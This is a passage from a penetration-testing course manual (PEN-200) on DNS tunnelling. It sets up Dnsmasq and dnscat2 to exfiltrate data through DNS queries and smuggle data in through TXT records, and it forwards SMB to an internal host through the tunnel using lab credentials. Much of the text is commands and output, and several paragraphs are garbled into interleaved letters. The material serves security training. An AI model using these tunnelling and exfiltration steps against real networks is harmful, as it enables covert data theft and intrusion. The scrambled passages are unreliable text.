+alongside our Kali machine. This means that MULTISERVER03, CONFLUENCE01, and our Kali
+machine can route to it, but PGDATABASE01 and HRSHARES cannot.
+
+FELINEAUTHORITY is registered within this network as the authoritative name server for the
+feline.corp zone. We will use it to observe how DNS packets reach an authoritative name server.
+We will watch DNS packets being exchanged between PGDATABASE01 and FELINEAUTHORITY.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  670
+                                                                                                                              Penetration Testing with Kali Linux
+
+While PGDATABASE01 cannot connect directly to FELINEAUTHORITY, it can connect to
+MULTISERVER03. MULTISERVER03 is also configured as the DNS resolver server for
+PGDATABASE01.
+
+                                          Figure 280: The network layout for our DNS experiments
+
+     In the real world, we will have registered the feline.corp domain name ourselves, set up
+     the authoritative name server machine ourselves, and told the domain registrar that this
+     server should be known as the authoritative name server for the feline.corp zone.
+In orcfHadiolneolndrowfttoiehgouveuresrrrseep,eedefro.rvhiIrpenoshrwaiemforrDaepr NallairlclSelditgfeyreiepsliiqntlnorueatyeh.tmcisiosotensrlnpaswtb,rteoiwelqlneeubvnweeisrsoourJtenurseelml.fadftyehrneneaedytte, atdFWonEhtyoiFLtIoEcNltLoohEIwnNeAfrEiUgDATuNUHreSTOHtsRheOeITrRvsYIeeTrirssYvepwfrrroooauvmnlidddePteadGvkepDenrAectTu-aaArelBlyAofSE01,
+AFwoErsedLeiInnNr etpEoerAdecUvoTitonoHunOseincReitItxTitaaoYtme.thFpeolDerNSst,SShwHatersereecqOraauSvsne-eos5ron7tosn7, nl5wy2fPer1aoG9ncm0DeceeAdsPTsGaAPBDsGAhAeSDTlEAAl o0TB1nAA,BeSwaAEec0Sh1mE,o0uf1astnththdperisovmeoutmgohtnahictrCoohOruinNgwehFshL.CaUOtENNcFCoLmEU0eE1sN. CSinEo0, t1ion.
+We'll compromise CONFLUENCE01 by exploiting CVE-2022-26134 with our reverse shell payload
+and create an SSH remote port forward to relay a port on our Kali machine to the SSH service on
+PGDATABASE01. We'll then SSH into PGDATABASE01 as the database_admin user.
+
+Since FELINEAUTHORITY is also on the WAN, we can SSH directly into FELINEAUTHORITY using
+the username kali and the password 7he_C4t_c0ntro11er.
+
+We now have two open shells. The first is on PGDATABASE01 as the database_admin user, and
+the second is on FELINEAUTHORITY as the kali user.
+
+To simulate a real DNS setup, we can make FELINEAUTHORITY a functional DNS server using
+Dnsmasq. Dnsmasq is DNS server software that requires minimal configuration. A few Dnsmasq
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  671
+                                                                                                Penetration Testing with Kali Linux
+
+configuration files are stored in the ~/dns_tunneling folder, which we'll use as part of our DNS
+experiments. For this initial experiment, we'll use the very sparse dnsmasq.conf configuration file.
+
+kali@felineauthority:~$ <cu>cd dns_tunneling</cu>
+
+kali@felineauthority:~/dns_tunneling$ <cu>cat dnsmasq.conf</cu>
+# Do not read /etc/resolv.conf or /etc/hosts
+no-resolv
+no-hosts
+
+# Define the zone
+auth-zone=feline.corp
+auth-server=feline.corp
+
+                                       Listing 652 - The basic configuration for our Dnsmasq server.
+
+This configuration ignores the /etc/resolv.conf and /etc/hosts files and only defines the auth-
+zone and auth-server variables. These tell Dnsmasq to act as the authoritative name server for the
+feline.corp zone. We have not configured any records so far. Requests for anything on the
+feline.corp domain will return failure responses.
+
+Now that the configuration is set, we'll start the dnsmasq process with the dnsmasq.conf
+configuration file (-C), making sure it runs in "no daemon" (-d) mode so it runs in the foreground.
+We can kill it easily again later.
+
+kali@felineauthority:~/dns_tunneling$ <cu>sudo dnsmasq -C dnsmasq.conf -d</cu>
+
+dnsmasq: started, version 2.88 cachesize 150
+
+dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-
+
+Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
+
+dnsmasq:  warning: no upstream servers                    DcnosmnfaisgquwriteWhdhtihtelboawsic
+dnsmasq:  cleared cache
+
+                                  Listing 653 - Starting                                        configuration.
+
+[DtIklnasicNpuslaSddtin@oueopnmf]taeiphcln:pekgairevsnstoeesshwraneooubletronl hdnsoUesonfr1Do9ioFPtr2uE/,ty5Lp:kI3l~uaN,it$lEuniAs<s:kLicu-UinsupttTgip>ynOHtrsgpShueeO-6esd55RosE74cI7eNTa-5dt1SpY2c,0tt,a1pMurw9duBtri0suneegme('JlfpEltielct-stfpehv-efdre[itrurvumeun]eydppe.npot.stcnp).1p,9oFf2dErtsoLuInru5mNad3Eppfp.AsuUthlpoToloHltriOsptRtlreIeo5Tnnt3Ygo<.otc/nhocluth2>e6d2ee1cn4os4d1e9by2tiensterface for
+
+Now that tcpdump is listening and Dnsmasq is running on FELINEAUTHORITY, we will move to
+our shell on PGDATABASE01. From there we will make DNS queries aimed at the feline.corp
+domain.
+
+First let's confirm PGDATABASE01's DNS settings. Since DNS resolution is handled by systemd-
+resolved we can check the DNS settings using the resolvectl utility.
+
+database_admin@pgdatabase01:~$ <cu>resolvectl status</cu>
+...
+
+Link 5 (ens224)
+          Current Scopes: DNS
+
+DefaultRoute setting: yes
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                        672
+                                                                          Penetration Testing with Kali Linux
+
+            LLMNR setting: yes
+MulticastDNS setting: no
+
+   DNSOverTLS setting: no
+          DNSSEC setting: no
+
+       DNSSEC supported: no
+   <cr>Current DNS Server: 10.4.50.64</cr>
+
+                <cr>DNS Servers: 10.4.50.64</cr>
+
+Link 4 (ens192)
+          Current Scopes: DNS
+
+DefaultRoute setting: yes
+            LLMNR setting: yes
+
+MulticastDNS setting: no
+   DNSOverTLS setting: no
+          DNSSEC setting: no
+       DNSSEC supported: no
+   <cr>Current DNS Server: 10.4.50.64</cr>
+                <cr>DNS Servers: 10.4.50.64</cr>
+
+          Listing 655 - Checking the configured DNS server on PGDATABASE01.
+
+PGDATABASE01's DNS server is set to 10.4.50.64 (MULTISERVER03). It will query
+MULTISERVER03 any time it needs a domain name resolved. But PGDATABASE01 has no
+outgoing network connectivity, so it can't communicate directly with FELINEAUTHORITY or our
+Kali machine.
+
+As an experiment, let's use nslookup to make a DNS request for exfiltrated-data.feline.com.
+
+database_admin@pgdatabase01:~$ <cu>nslookup exfiltrated-data.feline.corp</cu>
+                                                  Whitlow
+Server:   127.0.0.53
+Address:  127.0.0.53#53
+
+tT*h*hoisusnnegrroshevl,rtomeuaorsraknwlucsaapesnauh'nisttaL'esvNisdfettXiihnntDnhge'tdOe6Dc5MDoeN6nxANS-ffIUSiNigrselisunstrergeoreOrnsavlSdvstpe-leooe5roroud7nrkpu7-rsu5rdnDpeo2anNtv1toit9niaShdm0g.aesaftdoJekeeneirlbnfvaiytfdehnDrirtceeNhet.aySoelcotresaocesyrqcasuptlhtuet:hesoatemNslflyoXtdDrDis-neNOrexetMSefrsiAvlrtoIefrralaNevtaceqenedduy-deosarsfeetta1rc.vf2foeiac7lriidne.l0eesr.d.c.u0o.n.r5Tpn3hin.isTghoiisns  expected
+                                                                                                                                                                                                                                                                                                                                                                                                                                      is
+
+Ubuntu. It will forward the query to the DNS server that's configured by Netplan.
+
+However, it may cache results. If we receive outdated DNS responses, we should try
+
+flushing the local DNS cache with resolvectl flush-caches. We can also query the DNS
+
+server directly by appending the serve address to the nslookup command. For example:
+
+nslookup exfiltrated-data.feline.corp 192.168.50.64.
+
+The tcpdump program on FELINEAUTHORITY captured DNS packets from MULTISERVER03.
+
+kali@felineauthority:~$ <cu>sudo tcpdump -i ens192 udp port 53</cu>
+[sudo] password for kali:
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                                                                                                              673
+                                                                                                                              Penetration Testing with Kali Linux
+
+<cr>04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A?
+exfiltrated-data.feline.corp. (57)
+04:57:40.721786 IP 192.168.118.4.domain > 192.168.50.64.65122: 26234 NXDomain 0/0/1
+(57)</cr>
+
+     Listing 657 - DNS requests for exfiltrated-data.feline.corp coming in to FELINEAUTHORITY from MULTISERVER03.
+
+In this case, we've received a DNS A record request for exfiltrated-data.feline.corp on
+FELINEAUTHORITY. This happened because MULTISERVER03 determined the authoritative
+name server for the feline.corp zone. All requests for any subdomain of feline.corp will be
+forwarded to FELINEAUTHORITY. We didn't tell Dnsmasq on FELINEAUTHORITY what to do with
+requests for exfiltrated-data.feline.corp, so Dnsmasq just returned an _NXDomain__ response. We
+can see this flow in the following diagram.
+
+hTahveestbeepesnwohmeriFteitgeuMdreUh2L8eT1r:IeSThEfeoRrrVeqEsuiRems0tp3flliocswietanyf.tteBqr uuisJetseurfiiinenfgsraaetnyonnWotshhlroimeotkraluoolpowfntoerntewaxfmoiltrrekatsesdei-rtduvaeatarts.ifoeanlinn,edt.choTerpLsDe  name   server
+                                                                                                                                                                                                                                steps  would
+AspwmrnaeyacalertlbodaietamrntahoreeyuxnrDteteNsqrnSuoaefqlsiunsteefmorryvramedfrreaowtmtioeonaFcnoEO(eSnLix-nItN5frtio7elEt7lrr.An5aT2Uathe1lT9idhsH0odmOsaRtataI(yTw)sYfiter.hoemmnoisnoustbhidteleer,tobhuuettbnioteutilwnludosrtckroatntoenstehctehtiavotiutwyts)eihdcaeas, nwfotitruhanondusftietasr
+
+direct connection, just by making DNS queries.
+
+Exfiltrating small chunks of plaintext data is one thing, but imagine we have a binary file we want
+to exfiltrate from PGDATABASE01. How might we do that?
+
+This would require a series of sequential requests. We could convert a binary file into a long hex
+string representation, split this string into a series of smaller chunks, then send each chunk in a
+DNS request for [hex-string-chunk].feline.corp. On the server side, we could log all the DNS
+requests and convert them from a series of hex strings back to a full binary. We won't go into
+further details here, but this should clarify the general concept of DNS network exfiltration.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                               674
+                                                                          Penetration Testing with Kali Linux
+
+Now that we have covered the process of exfiltrating data from a network, let's consider how we
+might infiltrate data into a network.
+
+The DNS specification includes various records. We've been making A record requests so far. An
+A record response contains an IPv4 address for the requested domain name.
+
+But there are other kinds of records, some of which we can use to smuggle arbitrary data into a
+network. One of these is the TXT record. The TXT record is designed to be general-purpose and
+contains "arbitrary string information".
+
+We can serve TXT records from FELINEAUTHORITY using Dnsmasq. First, we'll kill our previous
+
+C c dnsmasq process with a + . Then we'll check the contents of dnsmasq_txt.conf and run
+
+dnsmasq again with this new configuration.
+
+kali@felineauthority:~/dns_tunneling$ <cu>cat dnsmasq_txt.conf</cu>
+# Do not read /etc/resolv.conf or /etc/hosts
+no-resolv
+no-hosts
+
+# Define the zone
+auth-zone=feline.corp
+auth-server=feline.corp
+
+# TXT record
+<cr>txt-record=www.feline.corp,here's something useful!
+txt-record=www.feline.corp,here's something else less useful.</cr>
+
+kali@felineauthority:~/dns_tunneling$ <cu>sudo dnsmasq -C dnsmasq_txt.conf -d</cu>
+          scccwlooatamnrenpanrtiriternleageddLc,:istcktanivinmiecogpehr6uess5eiop8psto-tntCrnih2oefetn.ac8smsk8e:intsgceItaaPrhevucvt6heTrheXssGTicNcUzrcoJyoe-nepngffitf1egfuio5trrhg0oeaaupytirstohenWdDhfiiDBletNutlSshoSewEnnCos-talUroBtinougps-Didn1esm8tneacsItqDwNiit2nhoiDtt.HiCfPy
+dnsmasq:                                                                                                                                                                                                                                                                                      DHCPv6 no-
+dnsmasq:                                                                                                                                                                                                                                                                                      dumpfile
+Lua TFTP
+dnsmasq:
+dnsmasq:
+
+tr"Trhheehecpeeronreerd'sdasnenssnreomatsqmrabuaesiettqTrsha_XtisrtnTyxgtfr.soceetrolcrsinonwefrgdwlecaswtohtstn.arftuietbaslDuiinneOtnfseeSus.,-cmlt.5swo"7earo7pps5aq2esr1xwah9ttori0elaludslldeibnryerveesat.usEcrtanoacmrhtthinmcegoasn.wttFraiitrnihnogsms"ttxh"ttheh-reeedrscoeeo'msrtdaws=iono"m.tdhEeeeatfhcTinhiXnitgTioofrnuestsch,eoeafrsundely!"islTianfXnoeTdrs,
+
+Let's test this hypothesis. Back on PGDATABASE01, we'll make a request for TXT records for
+www.feline.corp with nslookup by passing the -type=txt argument.
+
+database_admin@pgdatabase01:~$ <cu>nslookup -type=txt www.feline.corp</cu>
+
+Server:   192.168.50.64
+
+Address: 192.168.50.64#53
+
+Non-authoritative answer:
+<cr>www.feline.corp text = "here's something useful!"
+www.feline.corp text = "here's something else less useful."</cr>
+
+Authoritative answers can be found from:
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                      675
+                                                                                                                                                            Penetration Testing with Kali Linux
+
+database_admin@pgdatabase01:~$
+                                       Listing 659 - The TXT record response from www.feline.corp.
+
+Success! We received the arbitrary string attributes that were defined in dnsconfig_txt.conf.
+
+This is one way to get data into an internal network using DNS records. If we wanted to infiltrate
+binary data, we could serve it as a series of Base64 or ASCII hex encoded TXT records and convert
+that back into binary on the internal server.
+
+In this section, we discussed how we might infiltrate or exfiltrate data through various types of
+DNS records. In the next section we'll get some hands-on experience with the dnscat2 framework,
+which leverages these techniques to create a multipurpose DNS tunnel.
+
+20.2.2 DNS tunneling with dnscat2
+
+We can use dnscat2 to exfiltrate data with DNS subdomain queries and infiltrate data with TXT
+(and other) records.
+
+A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which
+are configured to make queries to that domain) are run on compromised machines.
+
+Let's try out dnscat2. We'll inspect traffic from FELINEAUTHORITY with tcpdump, filtering
+specifically on UDP port 53 (udp port 53).
+
+kali@felineauthority:~$ <cu>sudo tcpdump -i ens192 udp port 53</cu>
+
+[sudo] password for kali:
+
+tlicpsdtuemnip:ngvoenrboesnse19o2u,tLpisluttiinngks6u-6pt0py-rpSeetsasErteNind1g,0tMcuBpdsue(mEt-phvtoe[rvlisn]te.et.Wn).hfio,rtfplsoaonrcwakpfesutshloolntpUlrDeoPntpgootcrtho5l32.6d2e1c4o4debytes
+
+C c tWhee'lflekliinlleo.cuorrpexdisotminaginDanssmthaesoqnplyroacrgeusms ewnittJh.efafrey +                                               and run dnscat2-server instead, passing
+
+NNkWeeeawwllciwo@wiimfeenndldtioonowwedaccrnurteeshaacattoreteddi2::!ty0:cSor~y$mpe<todcou->cdOdueSnmb-seu5ncg77at5ta2t21i-9os0nermvaeyr  feline.corp</cu>
+                                                                                                                                          be out of date.
+
+auto_attach => false
+history_size (for new windows) => 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+<cr>Starting Dnscat2 DNS server on 0.0.0.0:53</cr>
+[domains = feline.corp]...
+
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
+
+   ./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp
+To talk directly to the server without a domain name, run:
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                              676
+                                                                          Penetration Testing with Kali Linux
+
+./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7
+
+Of course, you have to figure out <server> yourself! Clients
+will connect directly on UDP port 53.
+
+dnscat2>
+
+                      Listing 661 - Starting the dnscat2 server.
+
+This indicates that the dnscat2 server is listening on all interfaces on UDP/53.
+
+Now that our server is set up, we'll move to PGDATABASE01 to run the dnscat2 client binary. The
+binary is already on the server for this exercise. However, we could have transferred the binary
+from our Kali machine to PGDATABASE01 via our SSH connection using SCP.
+
+Thinking about exfiltration techniques (like DNS tunneling) may seem to present a
+"chicken or the egg" problem. How do we get the DNS tunneling client onto a host if we
+don't have command execution? Exfiltration is simply a tool we'll use to transfer data. It
+should be coupled with an exploitation vector that provides access to the target network.
+
+We'll run the dnscat2 client binary from the dnscat folder in the database_admin home directory,
+with the feline.corp domain passed as the only argument.
+
+database_admin@pgdatabase01:~$ <cu>cd dnscat/</cu>
+
+database_admin@pgdatabase01:~/dnscat$ <cu>./dnscat feline.corp</cu>
+
+Creating DNS driver:
+
+domain = feline.corp
+
+ host = 0.0.0.0                 For                 Whitlow               verify                                              the  server  also
+ port = 53                           addeJdefsferceuyrity, please
+ type = TXT,CNAME,MX
+ server = 127.0.0.53
+
+Encrypted session established!
+displays this string:
+
+A<cnrno>ySeMssoinaonSepiscteabdliOustherdaLi!ns<tinS/gctur6Om>6S2p-5- V7T7ihe5s2ad1sn9s0cat2 client running on PGDATABASE01.
+
+The dnscat2 client reports that a session has been established. We can check for connections
+back on our dnscat2 server.
+
+kali@felineauthority:~$ <cu>dnscat2-server feline.corp</cu>
+[sudo] password for kali:
+
+New window created: 0
+New window created: crypto-debug
+Welcome to dnscat2! Some documentation may be out of date.
+
+auto_attach => false
+history_size (for new windows) => 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                         677
+                                                                          Penetration Testing with Kali Linux
+
+Starting Dnscat2 DNS server on 0.0.0.0:53
+[domains = feline.corp]...
+
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
+
+./dnscat --secret=7a87a5d0a8480b080896606df6b63944 feline.corp
+
+To talk directly to the server without a domain name, run:
+
+./dnscat --dns server=x.x.x.x,port=53 --secret=7a87a5d0a8480b080896606df6b63944
+
+Of course, you have to figure out <server> yourself! Clients
+will connect directly on UDP port 53.
+
+dnscat2> <cr>New window created: 1
+Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+For added security, please ensure the client displays the same string:
+
+>> Annoy Mona Spiced Outran Stump Visas</cr>
+
+dnscat2>
+
+          Listing 663 - The connection coming in from the dnscat2 client.
+
+Our session is connected! DNS is working exactly as expected. Requests from PGDATABASE01
+are being resolved by MULTISERVER03 and end up on FELINEAUTHORITY.
+
+     When run without a pre-shared --secret flag at each end, dnscat2 will print an
+     haSuatutshmbepenetVinciasntaeiosg"no) stisitarttinhegde..sTTahhmeiseaisuotnuhsbeenodttihtcoactlviieoenrnitfsyatntrhidnegsceionWrvhntienhtrei,slcsoctowiaowsneein(k"tAneognwrniotytyhaMefrteoe'nrsatnhSoepienicn-eclidnryeOptuiotrnan
+0.W80f77.e:1.:252ct202aa1::nm411440upb..se677er533ionc22u715g313r. 81aEtcfvp2IIe7PPdry1u1c1mte99im022p1..ep911rac66o818cc..eoed51Ons10eSns38.-e5.65td447co72..tmi5d58o2o.1no10mfn9iea7s0ili7tominJn>reae>tfdh.1fee9c1r,2o9eDt.2ryhNp1.e.16S86ar.(8ue71.tq551hu0)8ee..n46sti.4tcsd.a5ottom1io0afn7ien7lsi::ntrei22n.c99go0066wrp66i:+ll1c/[h01a/anu0g]eT.XTXTT?
+
+"b40d0140b6a895ada18b30ffff0866c42a" (111)
+07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME?
+bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
+07:22:15.388087 IP 192.168.118.4.domain > 192.168.50.64.65022: 65401 1/0/0 CNAME
+a2890158e06d79fd12c560ffff57240ba6.feline.corp. (124)
+07:22:15.741752 IP 192.168.50.64.50500 > 192.168.118.4.domain: 6144+ [1au] CNAME?
+38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp. (75)
+07:22:15.742436 IP 192.168.118.4.domain > 192.168.50.64.50500: 6144 1/0/0 CNAME
+e0630140b626a6fa2b82d8ffff0866c42a.feline.corp. (124)
+07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX?
+8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
+07:22:16.398299 IP 192.168.118.4.domain > 192.168.50.64.50860: 16449 1/0/0 MX
+385b0158e0dbec12770c9affff57240ba6.feline.corp. 10 (126)
+07:22:16.751880 IP 192.168.50.64.49350 > 192.168.118.4.domain: 5272+ [1au] MX?
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                                                        678
+                                                                                                                                                                                                                                    Penetration Testing with Kali Linux
+
+68fd0140b667aeb6d6d26119c3658f0cfa.feline.corp. (75)
+
+07:22:16.752376 IP 192.168.118.4.domain > 192.168.50.64.49350: 5272 1/0/0 MX
+
+d01f0140b66950a355a6bcffff0866c42a.feline.corp. 10 (126)
+
+07:22:17.407889 IP 192.168.50.64.50621 > 192.168.118.4.domain: 39215+ MX?
+
+cd6f0158e082e5562128b71e1353f111be.feline.corp. (64)
+
+07:22:17.408397 IP 192.168.118.4.domain > 192.168.50.64.50621: 39215 1/0/0 MX
+
+985d0158e00880dad6ec05ffff57240ba6.feline.corp. 10 (126)
+
+07:22:17.762124 IP 192.168.50.64.49720 > 192.168.118.4.domain: 51139+ [1au] TXT?
+
+49660140b6509f242f870119c47da533b7.feline.corp. (75)
+
+07:22:17.762610 IP 192.168.118.4.domain > 192.168.50.64.49720: 51139 1/0/0 TXT
+
+"8a3d0140b6b05bb6c723aeffff0866c42a" (111)
+
+07:22:18.417721 IP 192.168.50.64.50805 > 192.168.118.4.domain: 57236+ TXT?
+
+3e450158e0e52d9dbf02e91e1492b9d0c5.feline.corp. (64)
+
+07:22:18.418149 IP 192.168.118.4.domain > 192.168.50.64.50805: 57236 1/0/0 TXT
+
+"541d0158e09264101bde14ffff57240ba6" (111)
+
+07:22:18.772152 IP 192.168.50.64.50433 > 192.168.118.4.domain: 7172+ [1au] TXT?
+
+d34f0140b6d6bd4779cb2419c56ad7d600.feline.corp. (75)
+
+07:22:18.772847 IP 192.168.118.4.domain > 192.168.50.64.50433: 7172 1/0/0 TXT
+
+"17880140b6d23c86eaefe7ffff0866c42a" (111)
+
+07:22:19.427556 IP 192.168.50.64.50520 > 192.168.118.4.domain: 53513+ CNAME?
+
+8cd10158e01762c61a056c1e1537228bcc.feline.corp. (64)
+
+07:22:19.428064 IP 192.168.118.4.domain > 192.168.50.64.50520: 53513 1/0/0 CNAME
+
+b6e10158e0a682c6c1ca43ffff57240ba6.feline.corp. (124)
+
+07:22:19.782712 IP 192.168.50.64.50186 > 192.168.118.4.domain: 58205+ [1au] TXT?
+
+8d5a0140b66454099e7a8119c648dffe8e.feline.corp. (75)
+
+07:22:19.783146 IP 192.168.118.4.domain > 192.168.50.64.50186: 58205 1/0/0 TXT
+
+"2b4c0140b608687c966b10ffff0866c42a" (111)
+
+07:22:20.438134 IP 192.168.50.64.65235 > 192.168.118.4.domain: 52335+ CNAME?
+
+b9740158e00bc5bfbe3eb81e16454173b8.feline.corp. (64)
+
+b0c070723::d23222002::1124250080.eb.67407093208c42684584b303d2dI3If7PPc098119908f022..f1f911cf66f7889..515d791204f.80.6644b91a..d856.o0.9fmfae3e8lilniinn>e>e.1.c19c9oo22rr.p.p1.6.1W68hi8((.t711.l5152o8)40w.).464..do6m5a2i3n5::  52335 1/0/0 CNAME
+                                                                                                                                                                                                                                    958+ [1au] TXT?
+
+C c nnf.Tr.oeho.ttemw+pdotanhrrkse.tcidcdauant2ltsaacrp,layrDto2NbceSceslnLitesiesunftniiintscngtiuaeo6sll6itni4hntgo-egLisoOksCteSesN-rceovA5epfe7MrDrt7.laN5EoAi2S,ng1lTqllg9yutXi0nhenTrgeiJo,eesrtatefmhnsfqedtaruedeeMaetysrltaXttohfaffyqein!cluind.Teerhr.Wcieeiossesrpp'ol,aloaunnsgtdpsoseeureetapnshraipeneyvotalcoendpaasdldeusasmsna.pdaA.rheskuieliglnnedtccirdcpyaapdtttaueemddtr,pbasynowsthifittei'hssr
+
+Now we'll start interacting with our session from the dnscat2 server. Let's list all the active
+windows with the windows command, then run window -i from our new "command" shell to list
+the available commands.
+
+dnscat2> <cu>windows</cu>
+0 :: main [active]
+
+   crypto-debug :: Debug window for crypto stuff [*]
+   dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
+   <cr>1 :: command (pgdatabase01) [encrypted, NOT verified] [*]</cr>
+dnscat2> <cu>window -i 1</cu>
+New window created: 1
+history_size (session) => 1000
+Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                               679
+                                                                                Penetration Testing with Kali Linux
+
+For added security, please ensure the client displays the same string:
+
+>> Annoy Mona Spiced Outran Stump Visas
+This is a command session!
+
+That means you can enter a dnscat2 command such as
+'ping'! For a full list of clients, try 'help'.
+
+command (pgdatabase01) 1> <cu>?</cu>
+
+Here is a list of commands (use -h on any of them for additional help):
+
+* clear
+
+* delay
+
+* download
+
+* echo
+
+* exec
+
+* help
+
+* listen
+
+* ping
+
+* quit
+
+* set
+
+* shell
+
+* shutdown
+
+* suspend
+
+* tunnels
+
+* unset
+
+* upload
+
+* window
+
+* windows
+
+cTohmismarnedtu(rnpsgdaatparboamsep0t1L)wisi1ttihn>ga66"5c-oImntemraactnindg"wpitrhetfhixe.dnTsWhchiasit2tilcsoliewtnhtefrodmnsthceaste2rvcero. mmand session, and it
+                                              learnJemfforreyabout
+supports    quite  a  few  options.  We  can                              each  command  by  running  it  with  the  --
+help flag.
+
+C z Stcuuosinnnecnsleeoisll,wteewesn'herteseosrteisroyeinittnbwguypitlploarbetleuissnsdtnieennecglianipngsOptuhSo+l-iars5tt7eMo7.dn5Bo2aado1ncuu9dkl0reidp,nlnuetsshtch'esaecitdn2ovmtseoesmartviagesnarod,tceasknetehdstespwiopuenos,hrsltepTfteo'CscrPiwrfuyatn.rraLdlifesifnittcg'esntohb-pra-ohtciueoklgngphsr.o.ouWunredDcoNauSnr
+
+command (pgdatabase01) 1> <cu>listen --help</cu>
+
+Error: The user requested help
+
+Listens on a local port and sends the connection out the other side (<cr>like ssh
+
+-L</cr>). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
+
+--help, -h: Show this message
+
+                           Listing 666 - Information on the listen command.
+
+According to the help message output, listen operates much like ssh -L. And we should be very
+familiar with that by now.
+
+Let's try to connect to the SMB port on HRSHARES, this time through our DNS tunnel. We'll set up
+a local port forward, listening on 4455 on the loopback interface of FELINEAUTHORITY, and
+forwarding to 445 on HRSHARES.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                        680
+                                                                          Penetration Testing with Kali Linux
+
+command (pgdatabase01) 1> <cu>listen 127.0.0.1:4455 172.16.2.11:445</cu>
+Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
+command (pgdatabase01) 1>
+
+                        Listing 667 - Setting up a port forward from FELINEAUTHORITY to PGDATABASE01.
+
+From another shell on FELINEAUTHORITY we can list the SMB shares through this port forward.
+
+kali@felineauthority:~$ <cu>smbclient -p 4455 -L //127.0.0.1 -U hr_admin --
+password=Welcome1234</cu>
+Password for [WORKGROUP\hr_admin]:
+
+Sharename    Type  Comment
+
+---------    ----  -------
+
+ADMIN$       Disk  Remote Admin
+
+C$           Disk  Default share
+
+IPC$         IPC   Remote IPC
+
+<cr>scripts       Disk</cr>
+
+Users        Disk
+
+Reconnecting with SMB1 for workgroup listing.
+
+do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
+
+Unable to connect with SMB1 -- no workgroup available
+
+      Listing 668 - Connecting to HRSHARES's SMB server through the dnscat2 port forward.
+
+The connection is slower than a direct connection, but this is expected given that our SMB
+packets are being transported through the dnscat2 DNS tunnel. TCP-based SMB packets,
+encapsulated in DNS requests and responses transported over UDP, are pinging back and forth to
+the SMB server on HRSHARES, deep in the internal network. Excellent!
+
+F2rIdneeE0ssLptp.IhoN3iitnsEesAWeLtUhseTre.aaHWrnfOpaeincRpgutITsitneYUhdgnastietth,urnvawepetirett.hoeulrisseHtdRthSdeHnaAsvcRaaEiltSa2bJnlteeoofsrfhtrPuaenGyrenDsWeAhloiTntSAlMBaowABhSoEtsr0at1fdfiecheaptdhinrdosiuridegcehtthDceoNniSnnteercrentqiavuilteynsettstowaoonrukdr,
+
+apItnrnaydctinhkDgiesNttMoSinotstrudpanuevnlceeetr,ilsowineneg,mcwoooritvroheetrdhheneadsrrcdbnaeoetntOt2hewSd--Ho5arTn7nke7Td5ttPwr2ea1xaof9pnfr0ikedcreiDaennNnvacSirleyotdsnuissmno.nemWenlietensgo,p.fteoTtrhfhboeeyrspmperaoesssdstraHasntyTdesTgctPieeomsntussmnotnafheybalibtonetgpheu.wrsfieothfrumlCwhdiheseeenpl,
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                               681
+
